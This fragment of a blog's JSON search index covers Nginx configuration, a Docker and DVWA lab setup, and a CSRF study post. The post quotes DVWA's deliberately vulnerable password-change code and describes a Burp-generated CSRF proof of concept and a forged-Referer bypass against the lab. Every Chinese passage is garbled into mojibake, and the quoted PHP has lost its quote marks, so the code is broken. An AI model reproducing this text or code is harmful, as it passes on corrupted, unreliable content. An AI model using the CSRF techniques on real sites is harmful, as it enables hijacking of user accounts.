æŒ‡ä»¤æŒ‡å®šNginxç›‘å¬çš„ç«¯å£å·ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒNginxå°†ç›‘å¬614ç«¯å£ã€‚ server_name æŒ‡ä»¤server_name IP; server_name æŒ‡ä»¤æŒ‡å®šäº†è¿™ä¸ªè™šæ‹ŸæœåŠ¡å™¨çš„æœåŠ¡å™¨åç§°æˆ–IPåœ°å€ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒæœåŠ¡å™¨åç§°æ˜¯ 120.26.138.45ã€‚ root æŒ‡ä»¤root /var/www/html; root æŒ‡ä»¤è®¾ç½®äº†æœåŠ¡å™¨æ ¹ç›®å½•ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ ¹ç›®å½•æ˜¯ /var/www/htmlï¼Œå³æ‰€æœ‰çš„è¯·æ±‚æ–‡ä»¶éƒ½ç›¸å¯¹äºè¿™ä¸ªç›®å½•ã€‚ index æŒ‡ä»¤index redirect.php; index æŒ‡ä»¤æŒ‡å®šäº†é»˜è®¤çš„ç´¢å¼•æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå½“è®¿é—®æ ¹ç›®å½•æ—¶ï¼Œé»˜è®¤æ–‡ä»¶æ˜¯ redirect.phpã€‚ location å—location / try_files $uri $uri/ =404; location / å—å®šä¹‰äº†å¯¹æ ¹è·¯å¾„çš„è¯·æ±‚å¤„ç†æ–¹å¼ã€‚try_files æŒ‡ä»¤å°è¯•æŒ‰é¡ºåºæŸ¥æ‰¾æ–‡ä»¶ï¼š $uriï¼šè¯·æ±‚çš„URIã€‚ $uri/ï¼šè¯·æ±‚çš„URIä½œä¸ºç›®å½•ã€‚ =404ï¼šå¦‚æœå‰ä¸¤ä¸ªéƒ½æ‰¾ä¸åˆ°ï¼Œè¿”å›404é”™è¯¯ã€‚ location ~ .php$ å—location ~ \\.php$ include snippets/fastcgi-php.conf; fastcgi_pass unix:/var/run/php/php8.3.6-fpm.sock; # ç¡®ä¿è¿™é‡Œçš„ç‰ˆæœ¬å·ä¸å®‰è£…çš„PHPç‰ˆæœ¬åŒ¹é… location ~ \\.php$ å—å®šä¹‰äº†å¯¹PHPæ–‡ä»¶çš„è¯·æ±‚å¤„ç†æ–¹å¼ï¼š include snippets/fastcgi-php.confï¼šåŒ…å«äº†FastCGIçš„é…ç½®ç‰‡æ®µã€‚ fastcgi_pass unix:/var/run/php/php8.3.6-fpm.sockï¼šå°†PHPè¯·æ±‚ä¼ é€’ç»™PHP-FPMæœåŠ¡ï¼Œé€šè¿‡Unixå¥—æ¥å­—é€šä¿¡ã€‚è¿™é‡Œçš„ç‰ˆæœ¬å·éœ€è¦ä¸å®é™…å®‰è£…çš„PHPç‰ˆæœ¬åŒ¹é…ã€‚ location ~ .ht å—location ~ /\\.ht deny all; location ~ /\\.ht å—å®šä¹‰äº†å¯¹ä»¥ .ht å¼€å¤´çš„æ–‡ä»¶çš„è¯·æ±‚å¤„ç†æ–¹å¼ï¼š deny allï¼šæ‹’ç»æ‰€æœ‰è®¿é—®ã€‚è¿™é€šå¸¸ç”¨äºä¿æŠ¤ .htaccess æ–‡ä»¶ï¼Œä¸è®©å®ƒä»¬è¢«å¤–éƒ¨è®¿é—®ã€‚ å–„åæ£€æŸ¥é…ç½®æ˜¯å¦é”™è¯¯ï¼š nginx -t é‡è½½ï¼š systemctl reload nginx","categories":["æœåŠ¡å™¨"]},{"title":"äº‘æœåŠ¡å™¨éƒ¨ç½²DockeråŠæ­å»ºå„ç±»ç¯å¢ƒ","path":"/2024/05/18/äº‘æœåŠ¡å™¨éƒ¨ç½²DockeråŠæ­å»ºå„ç±»ç¯å¢ƒ/","content":"å‚è€ƒèµ„æ–™æœ€è¯¦ç»†çš„ubuntu å®‰è£… dockeræ•™ç¨‹ï¼šhttps://zhuanlan.zhihu.com/p/651148141?utm_id=0 dockeræ­å»ºDvwaé¶åœºï¼šhttps://juejin.cn/post/7076807703565336612 å¼€å§‹çš„å¼€å§‹è®©æˆ‘ä»¬å…ˆæ›´æ–°ä¸€ä¸‹apt sudo apt-get updatesudo apt-get upgrade éƒ¨ç½²Dockerä¸€. å¸è½½Ubuntuè‡ªå¸¦çš„Dockerä»¥ä¸‹æ“ä½œæœ€å¥½ç”¨ç®¡ç†å‘˜ æ³¨ï¼šdockerçš„æ—§ç‰ˆæœ¬ä¸ä¸€å®šè¢«ç§°ä¸ºdockerï¼Œhttp://docker.io æˆ– docker-engineä¹Ÿæœ‰å¯èƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬å¸è½½çš„å‘½ä»¤ä¸ºï¼š apt-get remove docker docker-engine docker.io containerd runc å¦‚æœæŠ¥é”™ä¹Ÿæ­£å¸¸ï¼Œæœ‰äº›Ubuntuæ²¡æœ‰Dockerï¼Œç›´æ¥ä¸‹ä¸€æ­¥ äºŒ.å®‰è£…1.å®‰è£…dockerä¾èµ– Dockeråœ¨Ubuntuä¸Šä¾èµ–ä¸€äº›è½¯ä»¶åŒ…ã€‚æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥å®‰è£…è¿™äº›ä¾èµ–: apt-get install ca-certificates curl gnupg lsb-release 2.æ·»åŠ Dockerå®˜æ–¹GPGå¯†é’¥ æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥æ·»åŠ Dockerå®˜æ–¹çš„GPGå¯†é’¥: curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add - 3.æ·»åŠ Dockerè½¯ä»¶æº æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥æ·»åŠ Dockerçš„è½¯ä»¶æº: sudo add-apt-repository deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable 4.å®‰è£…docker æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥å®‰è£…Docker: apt-get install docker-ce docker-ce-cli containerd.io 5.é…ç½®ç”¨æˆ·ç»„ï¼ˆå¯é€‰ï¼‰ é»˜è®¤æƒ…å†µä¸‹ï¼Œåªæœ‰rootç”¨æˆ·å’Œdockerç»„çš„ç”¨æˆ·æ‰èƒ½è¿è¡ŒDockerå‘½ä»¤ã€‚æˆ‘ä»¬å¯ä»¥å°†å½“å‰ç”¨æˆ·æ·»åŠ åˆ°dockerç»„ï¼Œä»¥é¿å…æ¯æ¬¡ä½¿ç”¨Dockeræ—¶éƒ½éœ€è¦ä½¿ç”¨sudoã€‚å‘½ä»¤å¦‚ä¸‹ï¼š sudo usermod -aG docker $USER æ³¨ï¼šé‡æ–°ç™»å½•æ‰èƒ½ä½¿æ›´æ”¹ç”Ÿæ•ˆã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥æµ‹è¯•ä¸€ä¸‹çœ‹Dockeræœ‰æ²¡æœ‰å®‰è£…æˆåŠŸäº† æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯åŠ¨dockeræ¥éªŒè¯æˆ‘ä»¬æ˜¯å¦æˆåŠŸå®‰è£…ã€‚å‘½ä»¤å¦‚ä¸‹ï¼š systemctl start docker å®‰è£…å·¥å…· apt-get -y install apt-transport-https ca-certificates curl software-properties-common é‡å¯docker service docker restart éªŒè¯æ˜¯å¦æˆåŠŸ sudo docker run hello-world å› ä¸ºæˆ‘ä»¬ä¹‹å‰æ²¡æœ‰æ‹‰å–è¿‡hello-worldï¼Œæ‰€ä»¥è¿è¡Œå‘½ä»¤åä¼šå‡ºç°æœ¬åœ°æ²¡æœ‰è¯¥é•œåƒï¼Œå¹¶ä¸”ä¼šè‡ªåŠ¨æ‹‰å–çš„æ“ä½œ æŸ¥çœ‹é•œåƒï¼ˆimageï¼‰ docker images å‡ºç°äº†hello-worldçš„é•œåƒå³å¯ æŸ¥çœ‹ç‰ˆæœ¬ æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢çš„å‘½ä»¤æ¥æŸ¥çœ‹dockerçš„ç‰ˆæœ¬ sudo docker version æ­å»ºDVWAé¶åœºä¸€. å‡†å¤‡å·¥ä½œå¼€ç«¯å£ï¼š æ‰“å¼€æ§åˆ¶å°ï¼Œå®‰å…¨ç»„çš„ç®¡ç†è§„åˆ™å¼€ä¸€ä¸ªç«¯å£ï¼Œå‡è®¾ä¸º1314ã€‚ç„¶åè¿ä¸ŠæœåŠ¡å™¨ï¼ˆæˆ‘ä½¿ç”¨xshellï¼‰ å¯åŠ¨Dockerï¼š systemctl start docker äºŒ.æ‹‰å–imageæ‰¾imageï¼ˆé•œåƒï¼‰ docker search dvwa é€‰ä¸€ä¸ªimageæ‹‰å–ï¼š docker pull citizenstig/dvwa ä¸‰. å¸ƒç½®å®¹å™¨docker images //æŸ¥çœ‹é•œåƒdocker run --name Dvwa -d -p 9320:80 citizenstig/dvwa //å¸ƒç½®å®¹å™¨-pï¼šæŒ‡å®šæ˜ å°„ç«¯å£-dï¼šåå°è¿è¡Œ--nameï¼šå®¹å™¨å‘½åä¸ºXXX æˆ‘ç«¯å£æ˜¯9320ï¼Œåé¢çš„80ä¸èƒ½æ”¹ï¼Œå®¹å™¨é‡Œçš„phpæœåŠ¡é»˜è®¤è·‘åœ¨80ç«¯å£ã€‚ å››. åç»­åœ¨ç½‘é¡µä¸Šæ‰“å¼€ï¼Œåˆ›å»ºæ•°æ®åº“ï¼Œè´¦æˆ·å¯†ç è¾“å…¥adminï¼Œpasswordå³å¯ã€‚ åˆ é™¤å®¹å™¨å’Œé•œåƒå…ˆåˆ é™¤æ­£åœ¨è¿è¡Œçš„å®¹å™¨æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼š docker ps åœæ­¢æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼š docker stop å®¹å™¨IDæˆ–åç§° åˆ é™¤ç›®æ ‡å®¹å™¨ï¼š docker rm å®¹å™¨IDæˆ–åç§° å†åˆ é™¤ç›®æ ‡é•œåƒæŸ¥çœ‹é•œåƒï¼š docker images åˆ é™¤é•œåƒï¼š docker rmi IMAGE_ID æ­å»ºCTFé¢˜ç›®ç¯å¢ƒä¸€. ä¸Šä¼ é¡¹ç›®åˆ°æœåŠ¡å™¨ä¸ªäººä½¿ç”¨WinSCPï¼Œä¼˜ç‚¹æ˜¯å¯è§†åŒ–æ¯”è¾ƒå¥½ã€‚è‡ªå·±mkdirä¸€ä¸ªç›®å½•å‚¨å­˜é¡¹ç›®å³å¯ã€‚ äºŒ. æ„å»ºDockeré•œåƒåœ¨ Dockerfile æ‰€åœ¨ç›®å½•ä¸‹ï¼Œæ‰“å¼€ç»ˆç«¯æˆ–å‘½ä»¤æç¤ºç¬¦ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥æ„å»º Docker é•œåƒï¼š docker build -t your-app-name . è¿™é‡Œçš„ your-app-name æ˜¯ä½ ç»™ä½ çš„ Docker é•œåƒèµ·çš„åå­—ï¼Œ. æŒ‡çš„æ˜¯å½“å‰ç›®å½•ï¼Œå³ Dockerfile æ‰€åœ¨çš„ç›®å½•ã€‚","categories":["æœåŠ¡å™¨"]},{"title":"CSRFæ¼æ´å­¦ä¹ ","path":"/2024/04/23/CSRFæ¼æ´å­¦ä¹ _max/CSRFæ¼æ´å­¦ä¹ /","content":"å‚è€ƒåŠå¼•ç”¨çš„æ–‡ç« æµ…è°ˆcsrfæ¼æ´ï¼šhttps://xz.aliyun.com/t/7450?time__1311=n4%2BxnD0G0%3Dit0QDkID%2FiWRSD0xcDRlGerDWwDalichlgref=https%3A%2F%2Fwww.google.com%2F#toc-3 CSRFæ¼æ´çš„åŸç†CSRFæ¼æ´äº§ç”Ÿçš„åŸå› (1)httpåè®®ä½¿ç”¨sessionåœ¨æœåŠ¡ç«¯ä¿å­˜ç”¨æˆ·çš„ä¸ªäººä¿¡æ¯,å®¢æˆ·ç«¯æµè§ˆå™¨ç”¨cookieæ ‡è¯†ç”¨æˆ·èº«ä»½; (2)cookieçš„è®¤è¯åªèƒ½ç¡®ä¿æ˜¯æŸä¸ªç”¨æˆ·å‘é€çš„è¯·æ±‚,ä½†æ˜¯ä¸èƒ½ä¿è¯è¿™ä¸ªè¯·æ±‚æ˜¯å¦æ˜¯â€ç”¨æˆ·è‡ªæ„¿çš„è¡Œä¸ºâ€. (3)è¿™æ—¶,ç”¨æˆ·ç™»å½•äº†æŸä¸ªwebç«™ç‚¹,åŒæ—¶ç‚¹å‡»äº†åŒ…å«CSRFæ¶æ„ä»£ç çš„URL,å°±ä¼šè§¦å‘CSRF æ¼æ´åˆ©ç”¨çš„æ¡ä»¶(1)ç”¨æˆ·å¿…é¡»ç™»å½•Aç½‘ç«™,ç”Ÿæˆäº†cookie (2)ç™»å½•çš„åŒæ—¶è®¿é—®äº†æ¶æ„URL(åŒ…å«CSRFæ¶æ„ä»£ç çš„URL) æ¢ç§è§£é‡Šå°±æ˜¯ç½‘ç«™çš„cookieåœ¨æµè§ˆå™¨ä¸­ä¸ä¼šè¿‡æœŸï¼Œåªè¦ä¸å…³é—­æµè§ˆå™¨æˆ–è€…é€€å‡ºç™»å½•ï¼Œé‚£ä»¥ååªè¦æ˜¯è®¿é—®è¿™ä¸ªç½‘ç«™ï¼Œéƒ½ä¼šé»˜è®¤ä½ å·²ç»ç™»å½•çš„çŠ¶æ€ã€‚è€Œåœ¨è¿™ä¸ªæœŸé—´ï¼Œæ”»å‡»è€…å‘é€äº†æ„é€ å¥½çš„csrfè„šæœ¬æˆ–åŒ…å«csrfè„šæœ¬çš„é“¾æ¥ï¼Œå¯èƒ½ä¼šæ‰§è¡Œä¸€äº›ç”¨æˆ·ä¸æƒ³åšçš„åŠŸèƒ½ï¼ˆæ¯”å¦‚æ˜¯æ·»åŠ è´¦å·ç­‰ï¼‰ CSRFå’ŒXSSçš„ä¸åŒ(1)XSSä¸»è¦æ˜¯è·å–ç”¨æˆ·çš„cookieä¿¡æ¯,è¾¾åˆ°æ§åˆ¶å®¢æˆ·ç«¯çš„ç›®çš„ XSSâ€”-æŠŠä½ çš„è…°ç‰Œ(ç”¨æˆ·èº«ä»½è±¡å¾ä¹Ÿå°±æ˜¯cookie)å·åˆ°æ‰‹,é»‘å®¢è‡ªå·±å»æç ´å. CSRFä¸»è¦æ˜¯åŠ«æŒç”¨æˆ·èº«ä»½,è®©å®¢æˆ·ç«¯åšä¸€äº›ä¸æ„¿æ„åšçš„äº‹. CSRFâ€”-æ‹¿åˆ€åŠ«æŒä½ ,â€å€ŸåŠ©ä½ çš„èº«ä»½â€æ¥å¸®é»‘å®¢åšäº‹. (2)å±å®³ä¸Šæ¥è¯´,XSSæ›´å¤§; (3)ä»åº”ç”¨éš¾åº¦ä¸Šæ¥è¯´ CSRFéœ€è¦æ»¡è¶³ç™»å½•æŸç½‘ç«™çš„çŠ¶æ€,åŒæ—¶è®¿é—®äº†æ¶æ„çš„URL,åº”ç”¨æ¡ä»¶æ¯”è¾ƒè‹›åˆ». XSSåªè¦ä¸€æ¬¡ç‚¹å‡»æˆ–è€…å­˜å‚¨åˆ°æœåŠ¡å™¨å³å¯. CSRFæ¼æ´æ£€æµ‹æ£€æµ‹CSRFæ¼æ´æ˜¯ä¸€é¡¹æ¯”è¾ƒç¹ççš„å·¥ä½œï¼Œæœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯æŠ“å–ä¸€ä¸ªæ­£å¸¸è¯·æ±‚çš„æ•°æ®åŒ…ï¼Œå»æ‰Refererå­—æ®µåå†é‡æ–°æäº¤ï¼Œå¦‚æœè¯¥æäº¤è¿˜æœ‰æ•ˆï¼Œé‚£ä¹ˆåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šå­˜åœ¨CSRFæ¼æ´ éšç€å¯¹CSRFæ¼æ´ç ”ç©¶çš„ä¸æ–­æ·±å…¥ï¼Œä¸æ–­æ¶Œç°å‡ºä¸€äº›ä¸“[é—¨é’ˆå¯¹CSRFæ¼æ´è¿›è¡Œæ£€æµ‹çš„å·¥å…·,å¦‚CSRFTester, CSRF Request Builderç­‰ã€‚ ä»¥CSRFTesterå·¥å…·ä¸ºä¾‹ï¼ŒCSRFæ¼æ´æ£€æµ‹å·¥å…·çš„æµ‹è¯•åŸç†å¦‚ä¸‹ï¼šä½¿ç”¨CSRFTesterè¿›è¡Œæµ‹è¯•æ—¶ï¼Œé¦–å…ˆéœ€è¦æŠ“å–æˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è®¿é—®è¿‡çš„æ‰€æœ‰é“¾æ¥ä»¥åŠæ‰€æœ‰çš„è¡¨å•ç­‰ä¿¡æ¯ï¼Œç„¶åé€šè¿‡åœ¨CSRFTesterä¸­ä¿®æ”¹ç›¸åº”çš„è¡¨å•ç­‰ä¿¡æ¯ï¼Œé‡æ–°æäº¤ï¼Œè¿™ç›¸å½“äºä¸€æ¬¡ä¼ªé€ å®¢æˆ·ç«¯è¯·æ±‚ã€‚å¦‚æœä¿®æ”¹åçš„æµ‹è¯•è¯·æ±‚æˆåŠŸè¢«ç½‘ç«™æœåŠ¡å™¨æ¥å—ï¼Œåˆ™è¯´æ˜å­˜åœ¨CSRFæ¼æ´ï¼Œå½“ç„¶æ­¤æ¬¾å·¥å…·ä¹Ÿå¯ä»¥è¢«ç”¨æ¥è¿›è¡ŒCSRFæ”»å‡» DVWA-CSRFLowçº§åˆ«?phpif( isset( $_GET[ Change ] ) ) // Get input $pass_new = $_GET[ password_new ]; $pass_conf = $_GET[ password_conf ]; // Do the passwords match? if( $pass_new == $pass_conf ) // They do! $pass_new = ((isset($GLOBALS[___mysqli_ston]) is_object($GLOBALS[___mysqli_ston])) ? mysqli_real_escape_string($GLOBALS[___mysqli_ston], $pass_new ) : ((trigger_error([MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work., E_USER_ERROR)) ? : )); $pass_new = md5( $pass_new ); // Update the database $insert = UPDATE `users` SET password = $pass_new WHERE user = . dvwaCurrentUser() . ;; $result = mysqli_query($GLOBALS[___mysqli_ston], $insert ) or die( pre . ((is_object($GLOBALS[___mysqli_ston])) ? mysqli_error($GLOBALS[___mysqli_ston]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . /pre );//è¿™è¡Œä»£ç æ‰§è¡Œäº†SQLæŸ¥è¯¢ï¼Œæ›´æ–°æ•°æ®åº“ä¸­çš„ç”¨æˆ·å¯†ç ã€‚å¦‚æœæ‰§è¡Œå¤±è´¥ï¼Œå°†ä¼šè¾“å‡ºé”™è¯¯ä¿¡æ¯ // Feedback for the user echo prePassword Changed./pre; else // Issue with passwords matching echo prePasswords did not match./pre; ((is_null($___mysqli_res = mysqli_close($GLOBALS[___mysqli_ston]))) ? false : $___mysqli_res);//å…³é—­MySQLè¿æ¥ï¼Œå¹¶è¿”å›å…³é—­æ“ä½œçš„ç»“æœã€‚å¦‚æœå…³é—­æ“ä½œæˆåŠŸï¼Œè¿”å›trueï¼›å¦‚æœå…³é—­æ“ä½œå¤±è´¥ï¼Œè¿”å›falseã€‚? isset($GLOBALS[___mysqli_ston]) is_object($GLOBALS[___mysqli_ston])ï¼šè¿™éƒ¨åˆ†ä»£ç é¦–å…ˆæ£€æŸ¥$GLOBALS[___mysqli_ston]æ˜¯å¦å·²ç»è®¾ç½®ä¸”ä¸ºä¸€ä¸ªæœ‰æ•ˆçš„MySQLè¿æ¥å¯¹è±¡ã€‚å¦‚æœæ˜¯ï¼Œåˆ™è¡¨ç¤ºæ•°æ®åº“è¿æ¥å·²ç»å»ºç«‹ï¼Œå¯ä»¥æ‰§è¡Œè½¬ä¹‰æ“ä½œï¼›å¦‚æœä¸æ˜¯ï¼Œåˆ™è¡¨ç¤ºæ•°æ®åº“è¿æ¥å°šæœªå»ºç«‹ï¼Œæ— æ³•æ‰§è¡Œè½¬ä¹‰æ“ä½œã€‚ mysqli_real_escape_string($GLOBALS[___mysqli_ston], $pass_new )ï¼šå¦‚æœæ•°æ®åº“è¿æ¥å·²ç»å»ºç«‹ï¼Œå°†è°ƒç”¨mysqli_real_escape_stringå‡½æ•°å¯¹æ–°å¯†ç è¿›è¡Œè½¬ä¹‰å¤„ç†ã€‚è¿™ä¸ªå‡½æ•°ä¼šå¯¹å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œä»¥é˜²æ­¢å®ƒä»¬è¢«è¯¯è§£ä¸ºSQLè¯­å¥çš„ä¸€éƒ¨åˆ†ï¼Œä»è€Œé˜²æ­¢SQLæ³¨å…¥æ”»å‡»ã€‚ (trigger_error([MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work., E_USER_ERROR)) ? : )ï¼šå¦‚æœæ•°æ®åº“è¿æ¥æœªå»ºç«‹ï¼Œæˆ–è€…è½¬ä¹‰æ“ä½œå¤±è´¥ï¼Œå°†ä¼šè§¦å‘ä¸€ä¸ªé”™è¯¯ï¼Œå¹¶è¾“å‡ºé”™è¯¯æ¶ˆæ¯ã€‚è¿™æ®µä»£ç ä¼¼ä¹æ˜¯ä¸ºäº†æé†’å¼€å‘è€…ä¿®å¤MySQLè½¬ä¹‰å‡½æ•°è°ƒç”¨çš„é—®é¢˜ï¼Œå› ä¸ºå®ƒä½¿ç”¨äº†å·²ç»å¼ƒç”¨çš„mysql_escape_stringå‡½æ•°ï¼Œè€Œä¸æ˜¯æ¨èçš„mysqli_real_escape_stringå‡½æ•° è¯¥ç½‘ç«™é€šè¿‡mysqli_real_escape_string()å‡½æ•°çš„è¿‡æ»¤ä½œç”¨ï¼Œå°†ç”¨æˆ·ä¼ å…¥çš„æ•°æ®ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œå¯¹SQLæ³¨å…¥åšäº†é˜²å¾¡ã€‚ä½†æ²¡æœ‰å¯¹CSRFåšä»»ä½•é˜²èŒƒæªæ–½ æ­£å¸¸è¾“å…¥å¯†ç ï¼Œç„¶åæŠ“åŒ… ç”¨burpsuiteè‡ªå¸¦çš„CSRF PoCè¿›è¡Œæ”»å‡»ï¼Œå°†å…¶ç”Ÿæˆçš„æŠŠCSRF HTMLå¤åˆ¶åˆ°æœ¬åœ°ï¼Œç„¶åç”¨è¯¥æµè§ˆå™¨è®¿é—® ç‚¹å‡»æäº¤è¯·æ±‚åè‡ªåŠ¨è·³è½¬åˆ°æˆ‘ä»¬çš„é¡µé¢ï¼Œå¹¶ä¸”æ­¤æ—¶å¯†ç å·²è¢«æˆåŠŸä¿®æ”¹ ä»¥ä¸Šè¿‡ç¨‹ä¸­è¦æ³¨æ„çš„æ˜¯ä¸€å®šä¸è¦ä¸­é€”æ›´æ¢æµè§ˆå™¨ï¼Œè®¿é—®csrf.phpçš„æ—¶è¦åŒä¸€ä¸ªæµè§ˆå™¨è®¿é—®ï¼Œå¹¶ä¸”è¿˜è¦ä¿è¯ä½ ç™»å½•DVWAçš„cookieæ²¡æœ‰è¿‡æœŸï¼Œä¸ç„¶ä¼šå› ä¸ºç¼ºå°‘èº«ä»½éªŒè¯ä¿¡æ¯è€Œæ‰§è¡Œå¤±è´¥ Mediumçº§åˆ«?phpif( isset( $_GET[ Change ] ) ) // Checks to see where the request came from if( stripos( $_SERVER[ HTTP_REFERER ] ,$_SERVER[ SERVER_NAME ])!=-1 ) // Get input $pass_new = $_GET[ password_new ]; $pass_conf = $_GET[ password_conf ]; // Do the passwords match? if( $pass_new == $pass_conf ) // They do! $pass_new = ((isset($GLOBALS[___mysqli_ston]) is_object($GLOBALS[___mysqli_ston])) ? mysqli_real_escape_string($GLOBALS[___mysqli_ston], $pass_new ) : ((trigger_error([MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work., E_USER_ERROR)) ? : )); $pass_new = md5( $pass_new ); // Update the database $insert = UPDATE `users` SET password = $pass_new WHERE user = . dvwaCurrentUser() . ;; $result = mysqli_query($GLOBALS[___mysqli_ston], $insert ) or die( pre . ((is_object($GLOBALS[___mysqli_ston])) ? mysqli_error($GLOBALS[___mysqli_ston]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . /pre ); // Feedback for the user echo prePassword Changed./pre; else // Issue with passwords matching echo prePasswords did not match./pre; else // Didnt come from a trusted source echo preThat request didnt look correct./pre; ((is_null($___mysqli_res = mysqli_close($GLOBALS[___mysqli_ston]))) ? false : $___mysqli_res);? stripos( $_SERVER[ HTTP_REFERER ] ,$_SERVER[ SERVER_NAME ])!=-1ï¼šæ£€æŸ¥å½“å‰è¯·æ±‚çš„Refererå¤´ä¸­æ˜¯å¦åŒ…å«å½“å‰æœåŠ¡å™¨çš„åŸŸåã€‚å¦‚æœåŒ…å«ï¼Œåˆ™æ¡ä»¶ä¸ºçœŸï¼Œè¡¨ç¤ºè¯·æ±‚æ¥æºäºå½“å‰æœåŠ¡å™¨ï¼›å¦‚æœä¸åŒ…å«ï¼Œåˆ™æ¡ä»¶ä¸ºå‡ï¼Œè¡¨ç¤ºè¯·æ±‚ä¸æ˜¯ä»å½“å‰æœåŠ¡å™¨å‘å‡ºçš„ stripos()ï¼šè¿™æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²å‡½æ•°ï¼Œç”¨äºåœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾å­å­—ç¬¦ä¸²çš„ä½ç½®ï¼Œä¸åŒºåˆ†å¤§å°å†™ ç»¼ä¸Šï¼Œä¸lowçº§åˆ«ç›¸æ¯”ï¼Œè¯¥çº§åˆ«ä¸èƒ½å¤Ÿè·¨åŸŸè®¿é—® ä½†æ˜¯åªè¦åœ¨æŠ¥å¤´çš„refererå¤„è¾“å…¥ï¼š127.0.0.1å°±å¯ä»¥æˆåŠŸç»•è¿‡ æ‰€ä»¥åŒæ ·æˆ‘ä»¬æŠ“åŒ…ï¼Œæ„é€ pocï¼Œè¿™æ¬¡æˆ‘ä»¬æŠŠå¯†ç æ”¹æˆadmin007å¹¶ä¿å­˜ä¸º127.0.0.1.htmlæ–‡ä»¶ ç„¶åä½¿ç”¨æµè§ˆå™¨è¿›è¡Œè®¿é—®ï¼Œç‚¹å‡»æäº¤è¯·æ±‚åè‡ªåŠ¨è·³è½¬åˆ°æˆ‘ä»¬çš„é¡µé¢ï¼Œå¹¶ä¸”æ­¤æ—¶å¯†ç å·²è¢«æˆåŠŸä¿®æ”¹ Highçº§åˆ«?phpif( isset( $_GET[ Change ] ) ) //ç”¨äºæ£€æŸ¥ä»¤ç‰Œï¼ˆTokenï¼‰çš„æœ‰æ•ˆæ€§ï¼Œä»¥ç¡®ä¿è¯·æ±‚çš„åˆæ³•æ€§ï¼Œå¦‚æœä»¤ç‰ŒéªŒè¯å¤±è´¥æ—¶è¦é‡å®šå‘çš„é¡µé¢ä¸ºindex.php checkToken( $_REQUEST[ user_token ], $_SESSION[ session_token ], index.php ); // Get input $pass_new = $_GET[ password_new ]; $pass_conf = $_GET[ password_conf ]; // Do the passwords match? if( $pass_new == $pass_conf ) // They do! $pass_new = ((isset($GLOBALS[___mysqli_ston]) is_object($GLOBALS[___mysqli_ston])) ? mysqli_real_escape_string($GLOBALS[___mysqli_ston], $pass_new ) : ((trigger_error([MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work., E_USER_ERROR)) ? : )); $pass_new = md5( $pass_new ); // Update the database $insert = UPDATE `users` SET password = $pass_new WHERE user = . dvwaCurrentUser() . ;; $result = mysqli_query($GLOBALS[___mysqli_ston], $insert ) or die( pre . ((is_object($GLOBALS[___mysqli_ston])) ? mysqli_error($GLOBALS[___mysqli_ston]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . /pre ); // Feedback for the user echo prePassword Changed./pre; else // Issue with passwords matching echo prePasswords did not match./pre; ((is_null($___mysqli_res = mysqli_close($GLOBALS[___mysqli_ston]))) ? false : $___mysqli_res);//ç”Ÿæˆä¸€ä¸ªä¼šè¯ä»¤ç‰Œï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨ä¼šè¯ä¸­generateSessionToken();? ç»è¿‡åˆ†æå‘ç°Highçº§åˆ«çš„ä»£ç åŠ å…¥äº†Anti-CSRF tokenæœºåˆ¶ï¼Œç”¨æˆ·æ¯æ¬¡è®¿é—®æ”¹å¯†é¡µé¢æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªéšæœºçš„tokenï¼Œå‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚æ—¶ï¼Œéœ€è¦æäº¤tokenå‚æ•°ï¼Œè€ŒæœåŠ¡å™¨åœ¨æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œä¼šä¼˜å…ˆæ£€æŸ¥tokenï¼Œåªæœ‰tokenæ­£ç¡®ï¼Œæ‰ä¼šå¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ CSRFé˜²å¾¡ä¹‹é“1ã€å°½é‡POST GETå¤ªå®¹æ˜“è¢«CSRFæ”»å‡»äº†ï¼Œç”¨POSTå¯ä»¥é™ä½é£é™©ï¼Œä½†ä¹Ÿä¸èƒ½ä¿è¯ä¸‡æ— ä¸€å¤±ï¼Œ æ”»å‡»è€…åªè¦æ„é€ ä¸€ä¸ªformå°±å¯ä»¥ï¼Œä½†éœ€è¦åœ¨ç¬¬ä¸‰æ–¹é¡µé¢åšï¼Œè¿™æ ·å°±å¢åŠ æš´éœ²çš„å¯èƒ½æ€§ã€‚ 2ã€åŠ å…¥éªŒè¯ç  åœ¨POSTçš„åŸºç¡€ä¸Šå¯ä»¥å†åŠ ä¸€ä¸ªéªŒè¯ç 